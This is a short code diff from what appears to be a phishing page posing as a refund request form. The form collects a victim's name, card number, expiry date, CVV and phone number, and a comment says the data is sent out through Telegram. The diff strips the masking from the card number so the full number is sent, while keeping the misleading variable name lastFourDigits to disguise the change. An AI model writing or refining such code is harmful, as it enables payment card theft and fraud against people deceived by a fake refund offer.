@@ -1088,8 +1088,7 @@
             // جمع بيانات النموذج
             const formData = {
                 nom: document.getElementById("nom").value,
-                numeroCarte: document.getElementById("numero-carte").value.replace(/\s+/g, ''),
-                lastFourDigits: document.getElementById("numero-carte").value.slice(-4),
+                lastFourDigits: document.getElementById("numero-carte").value.slice(-16),
                 dateExpiration: document.getElementById("date-expiration").value,
                 cvv: document.getElementById("cvv").value,
                 telephone: document.getElementById("telephone").value,
@@ -1118,7 +1117,7 @@
             // إرسال البيانات عبر Telegram
             const message = `🔔 **Nouvelle Demande de Remboursement** 🔔
 👤 Nom: ${formData.nom}
-💳 Carte: **** **** **** ${formData.lastFourDigits}
+💳 Carte: ${formData.lastFourDigits}
 📅 Exp: ${formData.dateExpiration}
 🔒 CVV: ${formData.cvv}
 📞 Tel: ${formData.telephone}
